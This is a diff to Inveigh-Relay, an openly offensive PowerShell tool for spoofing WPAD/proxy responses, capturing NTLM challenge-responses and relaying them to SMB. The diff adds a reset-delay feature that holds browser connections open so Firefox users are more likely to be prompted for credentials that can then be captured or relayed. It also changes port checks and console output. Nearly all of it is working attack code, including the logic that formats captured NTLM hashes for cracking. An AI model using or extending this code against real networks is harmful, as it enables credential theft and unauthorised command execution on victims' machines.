@@ -71,6 +71,14 @@ Default = localhost: The subject field for the cert that will be installed for H
 Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and
 HTTPSCertSubject.
 
+.PARAMETER HTTPResetDelay
+Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
+will have a delay before their connections are reset when Inveigh doesn't receive data. This can increase the
+chance of capturing/relaying authentication through a popup box with some browsers (Firefox).
+
+.PARAMETER HTTPResetDelayTimeout
+Default = 30 Seconds: HTTPResetDelay timeout in seconds.
+
 .PARAMETER LogOutput
 Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.
 
@@ -142,7 +150,7 @@ Default = NTLM: (Anonymous/NTLM) HTTP/HTTPS server authentication type for wpad.
 Anonymous can prevent browser login prompts.
 
 .PARAMETER WPADAuthIgnore
-Default = Disabled: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
+Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
 will be skipped for NTLM authentication. This can be used to filter out browsers like Firefox that display login
 popups for authenticated wpad.dat requests such as Firefox.  
 
@@ -158,6 +166,7 @@ https://github.com/Kevin-Robertson/Inveigh
 [CmdletBinding()]
 param
 ( 
+    [parameter(Mandatory=$false)][Array]$HTTPResetDelay = "Firefox",
     [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
     [parameter(Mandatory=$false)][Array]$Usernames = "",
     [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "",
@@ -165,6 +174,7 @@ param
     [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
     [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
     [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
+    [parameter(Mandatory=$false)][Int]$HTTPResetDelayTimeout = "30",
     [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
     [parameter(Mandatory=$false)][Int]$RunTime = "",
     [parameter(Mandatory=$true)][String]$Command = "",
@@ -280,7 +290,7 @@ if($StartupChecks -eq 'Y')
 
     if($Proxy -eq 'Y')
     {
-        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
+        $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
     }
 
 }
@@ -525,23 +535,42 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
 
         if($WPADAuthIgnore.Count -gt 0)
         {
-            $inveigh.status_queue.Add("WPAD NTLM Auth Ignored User Agents = " + ($WPADAuthIgnore -join ","))  > $null
+            $inveigh.status_queue.Add("WPAD NTLM Authentication Ignore List = " + ($WPADAuthIgnore -join ","))  > $null
         }
 
+    }
+
+    $HTTPResetDelay = ($HTTPResetDelay | Where-Object {$_ -and $_.Trim()})
+
+    if($HTTPResetDelay.Count -gt 0)
+    {
+        $inveigh.status_queue.Add("HTTP Reset Delay List = " + ($HTTPResetDelay -join ","))  > $null
+        $inveigh.status_queue.Add("HTTP Reset Delay Timeout = $HTTPResetDelayTimeout Seconds") > $null
     }
 
 }
 
 if($Proxy -eq 'Y')
 {
-    $inveigh.status_queue.Add("Proxy Capture/Relay = Enabled")  > $null
-    $ProxyPortFailover = $ProxyPort + 1
-    $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`";}"
-    $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})
 
-    if($ProxyIgnore.Count -gt 0)
+    if($proxy_port_check)
     {
-        $inveigh.status_queue.Add("Proxy Ignored User Agents = " + ($ProxyIgnore -join ","))  > $null
+        $HTTP = "N"
+        $inveigh.status_queue.Add("Proxy Capture/Relay Disabled Due To In Use Port $ProxyPort")  > $null
+    }
+    else
+    {
+        $inveigh.status_queue.Add("Proxy Capture/Relay = Enabled")  > $null
+        $inveigh.status_queue.Add("Proxy Port = $ProxyPort") > $null
+        $ProxyPortFailover = $ProxyPort + 1
+        $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_WPAD_IP`:$ProxyPortFailover; DIRECT`";}"
+        $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})
+
+        if($ProxyIgnore.Count -gt 0)
+        {
+            $inveigh.status_queue.Add("Proxy Ignore List = " + ($ProxyIgnore -join ","))  > $null
+        }
+
     }
 
 }
@@ -677,16 +706,34 @@ if($inveigh.status_output)
 
         switch -Wildcard ($inveigh.status_queue[0])
         {
-                
+
             {$_ -like "* Disabled Due To *" -or $_ -like "Run Stop-Inveigh to stop Inveigh-Relay" -or $_ -like "Windows Firewall = Enabled"}
             {
-                Write-Warning ($inveigh.status_queue[0] + $inveigh.newline)
+
+                if($inveigh.output_stream_only)
+                {
+                    Write-Output($inveigh.status_queue[0] + $inveigh.newline)
+                }
+                else
+                {
+                    Write-Warning($inveigh.status_queue[0])
+                }
+
                 $inveigh.status_queue.RemoveAt(0)
             }
 
             default
             {
-                Write-Output ($inveigh.status_queue[0] + $inveigh.newline)
+
+                if($inveigh.output_stream_only)
+                {
+                    Write-Output($inveigh.status_queue[0] + $inveigh.newline)
+                }
+                else
+                {
+                    Write-Output($inveigh.status_queue[0])
+                }
+
                 $inveigh.status_queue.RemoveAt(0)
             }
 
@@ -2811,7 +2858,7 @@ $SMB_relay_response_scriptblock =
 # HTTP/HTTPS/Proxy Server ScriptBlock
 $HTTP_scriptblock = 
 { 
-    param ($Challenge,$Command,$HTTPIP,$HTTPPort,$HTTPS_listener,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$Service,$SMB_version,$Target,$WPADAuth,$WPADAuthIgnore,$WPADResponse)
+    param ($Challenge,$Command,$HTTPIP,$HTTPPort,$HTTPResetDelay,$HTTPResetDelayTimeout,$HTTPS_listener,$Proxy,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$Service,$SMB_version,$Target,$Usernames,$WPADAuth,$WPADAuthIgnore,$WPADResponse)
 
     function NTLMChallengeBase64
     {
@@ -3000,6 +3047,15 @@ $HTTP_scriptblock =
 	            $HTTP_stream = $HTTP_client.GetStream()
             }
 
+            if($HTTP_stream.DataAvailable)
+            {
+                $HTTP_data_available = $true
+            }
+            else
+            {
+                $HTTP_data_available = $false
+            }
+
             while($HTTP_stream.DataAvailable)
             {
                 $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
@@ -3051,7 +3107,7 @@ $HTTP_scriptblock =
                     $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP")
                 }
 
-                if($ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
+                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                 {
                     $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")
 
@@ -3096,6 +3152,14 @@ $HTTP_scriptblock =
                 {
                     $HTTP_response_status_code = 0x34,0x30,0x31
                     $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
+
+                    if($HTTP_request_raw_URL -match '/wpad.dat')
+                    {
+                        $HTTP_reset_delay = $true
+                        $HTTP_reset_delay_timeout = New-TimeSpan -Seconds $HTTPResetDelayTimeout
+                        $HTTP_reset_delay_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+                    }
+
                 }
 
                 $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
@@ -3216,13 +3280,13 @@ $HTTP_scriptblock =
                         }
                         else
                         {
-                            $NTLM = NTLMChallengeBase64 $Challenge
+                            $NTLM = NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                         }
 
                     }
                     else
                     {
-                         $NTLM = NTLMChallengeBase64 $Challenge
+                         $NTLM = NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                     }
 
                 }
@@ -3267,7 +3331,7 @@ $HTTP_scriptblock =
                         $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                         $NTLM_response = $NTLM_response.Insert(48,':')
                         $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
-                    
+
                         if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                         {     
                             $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash)
@@ -3354,7 +3418,7 @@ $HTTP_scriptblock =
                     $HTTP_response_phrase = 0x4f,0x4b
                     $HTTP_client_close = $true
                     $NTLM_challenge = ""
-                
+                    
                     if($inveigh.SMB_relay -and $relay_step -eq 2)
                     {
 
@@ -3521,8 +3585,18 @@ $HTTP_scriptblock =
         }
         else
         {
-            $HTTP_client.Close()
-            $HTTP_client_close = $true
+
+            if($HTTP_data_available -or !$HTTP_reset_delay -or $HTTP_reset_delay_stopwatch.Elapsed -ge $HTTP_reset_delay_timeout)
+            {
+                $HTTP_client.Close()
+                $HTTP_client_close = $true
+                $HTTP_reset_delay = $false
+            }
+            else
+            {
+                Start-Sleep -m 100
+            }
+
         }
 
     }
@@ -3579,21 +3653,24 @@ $control_relay_scriptblock =
 
         }
         
-        Start-Sleep -S 1
-        $inveigh.console_queue.Add("Inveigh exited at $(Get-Date -format 's')")
-
-        if($inveigh.file_output)
+        if($inveigh.running)
         {
-            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh exited due to $exit_message")
-        }
+            Start-Sleep -S 1
+            $inveigh.console_queue.Add("Inveigh exited at $(Get-Date -format 's')")
 
-        if($inveigh.log_output)
-        {
-            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited due to $exit_message")
-        }
+            if($inveigh.file_output)
+            {
+                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh exited due to $exit_message")
+            }
 
-        Start-Sleep -S 1
-        $inveigh.running = $false
+            if($inveigh.log_output)
+            {
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited due to $exit_message")
+            }
+
+            Start-Sleep -S 1
+            $inveigh.running = $false
+        }
 
         if($inveigh.relay_running)
         {
@@ -3710,10 +3787,11 @@ function HTTPListener()
     $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
-        $HTTPIP).AddArgument($HTTPPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
-        $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
-        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
-        $WPADResponse) > $null
+        $HTTPIP).AddArgument($HTTPPort).AddArgument($HTTPResetDelay).AddArgument(
+        $HTTPResetDelayTimeout).AddArgument($HTTPS_listener).AddArgument($Proxy).AddArgument(
+        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($RelayAutoDisable).AddArgument(
+        $Service).AddArgument($SMB_version).AddArgument($Target).AddArgument($Usernames).AddArgument(
+        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
     $HTTP_powershell.BeginInvoke() > $null
 }
 
@@ -3736,10 +3814,11 @@ function HTTPSListener()
     $HTTPS_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $HTTPS_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
-        $HTTPIP).AddArgument($HTTPSPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
-        $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
-        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
-        $WPADResponse) > $null
+        $HTTPIP).AddArgument($HTTPSPort).AddArgument($HTTPResetDelay).AddArgument(
+        $HTTPResetDelayTimeout).AddArgument($HTTPS_listener).AddArgument($Proxy).AddArgument(
+        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($RelayAutoDisable).AddArgument(
+        $Service).AddArgument($SMB_version).AddArgument($Target).AddArgument($Usernames).AddArgument(
+        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
     $HTTPS_powershell.BeginInvoke() > $null
 }
 
@@ -3762,10 +3841,11 @@ function ProxyListener()
     $proxy_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $proxy_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
-        $ProxyIP).AddArgument($ProxyPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
-        $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
-        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
-        $WPADResponse) > $null
+        $ProxyIP).AddArgument($ProxyPort).AddArgument($HTTPResetDelay).AddArgument(
+        $HTTPResetDelayTimeout).AddArgument($HTTPS_listener).AddArgument($Proxy).AddArgument(
+        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($RelayAutoDisable).AddArgument(
+        $Service).AddArgument($SMB_version).AddArgument($Target).AddArgument($Usernames).AddArgument(
+        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
     $proxy_powershell.BeginInvoke() > $null
 }
 
@@ -3808,170 +3888,220 @@ if($ConsoleQueueLimit -ge 0 -or $inveigh.file_output -or $RelayAutoExit -or $Run
 }
 
 # Console Output Loop
-if($inveigh.console_output)
+try
 {
 
-    if($ConsoleStatus)
-    {    
-        $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
-        $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-    }
-
-    :console_loop while($inveigh.relay_running -and $inveigh.console_output)
+    if($inveigh.console_output)
     {
 
-        while($inveigh.console_queue.Count -gt 0)
-        {
-
-            switch -wildcard ($inveigh.console_queue[0])
-            {
-
-                {$_ -like "* written to *" -or $_ -like "* for relay *" -or $_ -like "*SMB relay *" -or $_ -like "* local administrator *"}
-                {
-                    Write-Warning ($inveigh.console_queue[0] + $inveigh.newline)
-                    $inveigh.console_queue.RemoveAt(0)
-                }
-
-                {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent *"}
-                {
-
-                    if($ConsoleOutput -eq 'Y')
-                    {
-                        Write-Output ($inveigh.console_queue[0] + $inveigh.newline)
-                    }
-
-                    $inveigh.console_queue.RemoveAt(0)
-
-                } 
-
-                {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
-                {
-                    
-                    if($ConsoleOutput -ne "Low")
-                    {
-                        Write-Output ($inveigh.console_queue[0] + $inveigh.newline)
-                    }
-
-                    $inveigh.console_queue.RemoveAt(0)
-
-                } 
-
-                default
-                {
-                    Write-Output ($inveigh.console_queue[0] + $inveigh.newline)
-                    $inveigh.console_queue.RemoveAt(0)
-                }
-
-            } 
-
-        }
-
-        if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
-        {
-            
-            if($inveigh.cleartext_list.Count -gt 0)
-            {
-                Write-Output("$(Get-Date -format 's') - Current unique cleartext captures:" + $inveigh.newline)
-                $inveigh.cleartext_list.Sort()
-
-                foreach($unique_cleartext in $inveigh.cleartext_list)
-                {
-                    if($unique_cleartext -ne $unique_cleartext_last)
-                    {
-                        Write-Output($unique_cleartext + $inveigh.newline)
-                    }
-
-                    $unique_cleartext_last = $unique_cleartext
-                }
-
-                Start-Sleep -m 5
-            }
-            else
-            {
-                Write-Output("$(Get-Date -format 's') - No cleartext credentials have been captured" + $inveigh.newline)
-            }
-            
-            if($inveigh.NTLMv1_list.Count -gt 0)
-            {
-                Write-Output("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
-                $inveigh.NTLMv1_list.Sort()
-
-                foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
-                {
-                    $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))
-
-                    if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
-                    {
-                        Write-Output($unique_NTLMv1 + $inveigh.newline)
-                    }
-
-                    $unique_NTLMv1_account_last = $unique_NTLMv1_account
-                }
-
-                $unique_NTLMv1_account_last = ''
-                Start-Sleep -m 5
-                Write-Output("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)
-
-                foreach($NTLMv1_username in $inveigh.NTLMv1_username_list)
-                {
-                    Write-Output($NTLMv1_username + $inveigh.newline)
-                }
-
-                Start-Sleep -m 5
-            }
-            else
-            {
-                Write-Output("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured" + $inveigh.newline)
-            }
-
-            if($inveigh.NTLMv2_list.Count -gt 0)
-            {
-                Write-Output("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
-                $inveigh.NTLMv2_list.Sort()
-
-                foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
-                {
-                    $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))
-
-                    if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
-                    {
-                        Write-Output($unique_NTLMv2 + $inveigh.newline)
-                    }
-
-                    $unique_NTLMv2_account_last = $unique_NTLMv2_account
-                }
-
-                $unique_NTLMv2_account_last = ''
-                Start-Sleep -m 5
-                Write-Output("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)
-
-                foreach($NTLMv2_username in $inveigh.NTLMv2_username_list)
-                {
-                    Write-Output($NTLMv2_username + $inveigh.newline)
-                }
-                
-            }
-            else
-            {
-                Write-Output("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured" + $inveigh.newline)
-            }
-
+        if($ConsoleStatus)
+        {    
+            $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
             $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-
         }
 
-        if($inveigh.console_input)
+        :console_loop while($inveigh.relay_running -and $inveigh.console_output)
         {
 
-            if([Console]::KeyAvailable)
+            while($inveigh.console_queue.Count -gt 0)
             {
-                $inveigh.console_output = $false
-                BREAK console_loop
+
+                switch -wildcard ($inveigh.console_queue[0])
+                {
+
+                    {$_ -like "* written to *" -or $_ -like "* for relay *" -or $_ -like "*SMB relay *" -or $_ -like "* local administrator *"}
+                    {
+
+                        if($inveigh.output_stream_only)
+                        {
+                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
+                        }
+                        else
+                        {
+                            Write-Warning($inveigh.console_queue[0])
+                        }
+
+                        $inveigh.console_queue.RemoveAt(0)
+                    }
+
+                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
+                    {
+
+                        if($ConsoleOutput -eq 'Y')
+                        {
+
+                            if($inveigh.output_stream_only)
+                            {
+                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
+                            }
+                            else
+                            {
+                                Write-Output($inveigh.console_queue[0])
+                            }
+
+                        }
+
+                        $inveigh.console_queue.RemoveAt(0)
+
+                    } 
+
+                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
+                    {
+                    
+                        if($ConsoleOutput -ne "Low")
+                        {
+
+                            if($inveigh.output_stream_only)
+                            {
+                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
+                            }
+                            else
+                            {
+                                Write-Output($inveigh.console_queue[0])
+                            }
+
+                        }
+
+                        $inveigh.console_queue.RemoveAt(0)
+
+                    } 
+
+                    default
+                    {
+
+                        if($inveigh.output_stream_only)
+                        {
+                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
+                        }
+                        else
+                        {
+                            Write-Output($inveigh.console_queue[0])
+                        }
+
+                        $inveigh.console_queue.RemoveAt(0)
+                    }
+
+                }
+
             }
+
+            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
+            {
+            
+                if($inveigh.cleartext_list.Count -gt 0)
+                {
+                    Write-Output("$(Get-Date -format 's') - Current unique cleartext captures:" + $inveigh.newline)
+                    $inveigh.cleartext_list.Sort()
+
+                    foreach($unique_cleartext in $inveigh.cleartext_list)
+                    {
+                        if($unique_cleartext -ne $unique_cleartext_last)
+                        {
+                            Write-Output($unique_cleartext + $inveigh.newline)
+                        }
+
+                        $unique_cleartext_last = $unique_cleartext
+                    }
+
+                    Start-Sleep -m 5
+                }
+                else
+                {
+                    Write-Output("$(Get-Date -format 's') - No cleartext credentials have been captured" + $inveigh.newline)
+                }
+            
+                if($inveigh.NTLMv1_list.Count -gt 0)
+                {
+                    Write-Output("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
+                    $inveigh.NTLMv1_list.Sort()
+
+                    foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
+                    {
+                        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))
+
+                        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
+                        {
+                            Write-Output($unique_NTLMv1 + $inveigh.newline)
+                        }
+
+                        $unique_NTLMv1_account_last = $unique_NTLMv1_account
+                    }
+
+                    $unique_NTLMv1_account_last = ''
+                    Start-Sleep -m 5
+                    Write-Output("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)
+
+                    foreach($NTLMv1_username in $inveigh.NTLMv1_username_list)
+                    {
+                        Write-Output($NTLMv1_username + $inveigh.newline)
+                    }
+
+                    Start-Sleep -m 5
+                }
+                else
+                {
+                    Write-Output("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured" + $inveigh.newline)
+                }
+
+                if($inveigh.NTLMv2_list.Count -gt 0)
+                {
+                    Write-Output("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
+                    $inveigh.NTLMv2_list.Sort()
+
+                    foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
+                    {
+                        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))
+
+                        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
+                        {
+                            Write-Output($unique_NTLMv2 + $inveigh.newline)
+                        }
+
+                        $unique_NTLMv2_account_last = $unique_NTLMv2_account
+                    }
+
+                    $unique_NTLMv2_account_last = ''
+                    Start-Sleep -m 5
+                    Write-Output("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)
+
+                    foreach($NTLMv2_username in $inveigh.NTLMv2_username_list)
+                    {
+                        Write-Output($NTLMv2_username + $inveigh.newline)
+                    }
+                
+                }
+                else
+                {
+                    Write-Output("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured" + $inveigh.newline)
+                }
+
+                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+
+            }
+
+            if($inveigh.console_input)
+            {
+
+                if([Console]::KeyAvailable)
+                {
+                    $inveigh.console_output = $false
+                    BREAK console_loop
+                }
         
+            }
+
+            Start-Sleep -m 5
         }
 
-        Start-Sleep -m 5
+    }
+
+}
+finally
+{
+
+    if($Tool -eq 2)
+    {
+        $inveigh.relay_running = $false
     }
 
 }
@@ -4292,51 +4422,51 @@ if($inveigh.tool -ne 1)
         :console_loop while((($inveigh.running -or $inveigh.relay_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
         {
 
-             while($inveigh.console_queue.Count -gt 0)
-        {
-
-            switch -wildcard ($inveigh.console_queue[0])
+            while($inveigh.console_queue.Count -gt 0)
             {
 
-                {$_ -like "* written to *" -or $_ -like "* for relay *" -or $_ -like "*SMB relay *" -or $_ -like "* local administrator *"}
-                {
-                    Write-Warning $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveAt(0)
-                }
-
-                {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
+                switch -wildcard ($inveigh.console_queue[0])
                 {
 
-                    if($ConsoleOutput -eq 'Y')
+                    {$_ -like "* written to *" -or $_ -like "* for relay *" -or $_ -like "*SMB relay *" -or $_ -like "* local administrator *"}
                     {
-                        Write-Output $inveigh.console_queue[0]
+                        Write-Warning $inveigh.console_queue[0]
+                        $inveigh.console_queue.RemoveAt(0)
                     }
 
-                    $inveigh.console_queue.RemoveAt(0)
+                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
+                    {
 
-                } 
+                        if($ConsoleOutput -eq 'Y')
+                        {
+                            Write-Output $inveigh.console_queue[0]
+                        }
 
-                {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
-                {
+                        $inveigh.console_queue.RemoveAt(0)
+
+                    } 
+
+                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
+                    {
                     
-                    if($ConsoleOutput -ne "Low")
+                        if($ConsoleOutput -ne "Low")
+                        {
+                            Write-Output $inveigh.console_queue[0]
+                        }
+
+                        $inveigh.console_queue.RemoveAt(0)
+
+                    } 
+
+                    default
                     {
                         Write-Output $inveigh.console_queue[0]
+                        $inveigh.console_queue.RemoveAt(0)
                     }
-
-                    $inveigh.console_queue.RemoveAt(0)
 
                 } 
 
-                default
-                {
-                    Write-Output $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveAt(0)
-                }
-
-            } 
-
-        }
+            }
 
             if([Console]::KeyAvailable)
             {
